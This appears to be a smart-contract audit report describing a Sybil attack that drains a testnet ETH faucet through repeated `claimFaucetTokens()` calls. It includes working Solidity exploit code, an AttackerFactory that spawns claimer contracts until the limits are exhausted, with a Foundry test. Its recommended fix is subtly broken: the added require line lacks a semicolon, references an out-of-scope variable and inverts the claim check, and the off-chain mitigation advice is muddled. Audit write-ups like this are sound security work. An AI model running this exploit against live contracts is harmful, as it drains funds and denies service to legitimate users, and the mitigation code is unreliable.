# Sybil DDoS Attack `claimFaucetTokens()`

## Summary

The `claimFaucetTokens()` function is vulnerable to Sybil DDoS attacks where attackers can deploy multiple contracts to overwhelm daily limits and profitably drain the faucet's ETH reserves, denying service to legitimate claimers.

## Description

### Normal Behavior

- Daily claim limit restricts number of claims per day via `dailyClaimCount`
- Daily ETH cap limits total ETH distributed per day via `dailySepEthCap`
- First-time claimers receive 0.005 ETH

### Issue

The contract is vulnerable to a **Sybil DDoS attack** where attackers deploy multiple contracts to overwhelm the faucet system:

Line: 179 - 181, 194

```solidity
function claimFaucetTokens() public {
    // ...
    if (dailyClaimCount >= dailyClaimLimit) {
        revert RaiseBoxFaucet_DailyClaimLimitReached();
    }
    //...
    if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
        // ...
        if (
            dailyDrips + sepEthAmountToDrip <= dailySepEthCap &&
            address(this).balance >= sepEthAmountToDrip
        ) {
            hasClaimedEth[faucetClaimer] = true;
            dailyDrips += sepEthAmountToDrip;

            (bool success, ) = faucetClaimer.call{value: sepEthAmountToDrip}("");
            // ...
        }
    }
    //...
    dailyClaimCount++;
}
```

The vulnerability exists because:

- The faucet can only verify addresses, not human identities
- Deployment cost is less than claim reward

## Risk

### Impact

**High**

- Concentration of ETH resources to single attacker instead of diverse user base
- Legitimate users cannot access faucet ETH when daily caps are exhausted
- Faucet loses ETH and token reserves faster than intended
- Attackers can use private transactions or submarine transactions, making it nearly impossible for the system to track and respond to attacks

### Likelihood

**High**

- Requires only basic contract deployment
- Attackers always earn significant profit
- The attack can be executed as soon as daily limits reset

## Proof of Concept

### Textual PoC

1. Attacker deploys multiple simple contracts to create fake user identities
2. Each contract calls `claimFaucetTokens()` as a first-time claimer and transfers all ETH and tokens to the attacker's address
3. The attack repeats daily via script → system becomes unavailable most of the time

### Coded PoC

```solidity
contract AttackerFactory {
    constructor(RaiseBoxFaucet faucet_) {
        faucet_.claimFaucetTokens();
        while (true) {
            if (
                address(faucet_).balance <= faucet_.sepEthAmountToDrip() ||
                faucet_.dailyClaimCount() >= faucet_.dailyClaimLimit()
            ) {
                break;
            }
            SybilAttacker newAttacker = new SybilAttacker();
            newAttacker.claim(faucet_);
        }
    }
}

contract SybilAttacker {
    function claim(RaiseBoxFaucet faucet_) external {
        faucet_.claimFaucetTokens();
    }

    receive() external payable {}
}

function testSybilDDoSAttack() public {
    vm.startPrank(user1);
    new AttackerFactory(raiseBoxFaucet);
    vm.stopPrank();

    vm.expectRevert();
    vm.startPrank(user2);
    raiseBoxFaucet.claimFaucetTokens();
    vm.stopPrank();
}
```

**SybilDDoSAttack.t.sol**: <https://github.com/Luu-Duc-Toan/2025-10-raisebox-faucet/blob/main/test/SybilDDoSAttack.t.sol>

## Recommended Mitigation

Combine with off-chain DDoS mitigation services (e.g., Cloudflare, AWS Shield) to verify claimers as human before on-chain execution:

```diff
function claimFaucetTokens() public {
+   require(hasClaimedEth[faucetClaimer], "Unverified claimer")
    //...
-    if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
-        uint256 currentDay = block.timestamp / 24 hours;
-
-        if (currentDay > lastDripDay) {
-            lastDripDay = currentDay;
-            dailyDrips = 0;
-            // dailyClaimCount = 0;
-        }
-
-        if (
-            dailyDrips + sepEthAmountToDrip <= dailySepEthCap &&
-            address(this).balance >= sepEthAmountToDrip
-        ) {
-            hasClaimedEth[faucetClaimer] = true;
-            dailyDrips += sepEthAmountToDrip;
-
-            (bool success, ) = faucetClaimer.call{
-                value: sepEthAmountToDrip
-            }("");
-
-            if (success) {
-                emit SepEthDripped(faucetClaimer, sepEthAmountToDrip);
-            } else {
-                revert RaiseBoxFaucet_EthTransferFailed();
-            }
-        } else {
-            emit SepEthDripSkipped(
-                faucetClaimer,
-                address(this).balance < sepEthAmountToDrip
-                    ? "Faucet out of ETH"
-                    : "Daily ETH cap reached"
-            );
-        }
-    } else {
-        dailyDrips = 0;
-    }
    //...
}

+ function claimFaucetTokens(address faucetClaimer) public onlyOwner {
+    if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
+        uint256 currentDay = block.timestamp / 24 hours;
+
+        if (currentDay > lastDripDay) {
+            lastDripDay = currentDay;
+            dailyDrips = 0;
+            // dailyClaimCount = 0;
+        }
+
+        if (
+            dailyDrips + sepEthAmountToDrip <= dailySepEthCap &&
+            address(this).balance >= sepEthAmountToDrip
+        ) {
+            hasClaimedEth[faucetClaimer] = true;
+            dailyDrips += sepEthAmountToDrip;
+
+            (bool success, ) = faucetClaimer.call{
+                value: sepEthAmountToDrip
+            }("");
+
+            if (success) {
+                emit SepEthDripped(faucetClaimer, sepEthAmountToDrip);
+            } else {
+                revert RaiseBoxFaucet_EthTransferFailed();
+            }
+        } else {
+            emit SepEthDripSkipped(
+                faucetClaimer,
+                address(this).balance < sepEthAmountToDrip
+                    ? "Faucet out of ETH"
+                    : "Daily ETH cap reached"
+            );
+        }
+    } else {
+        dailyDrips = 0;
+    }
+}
```
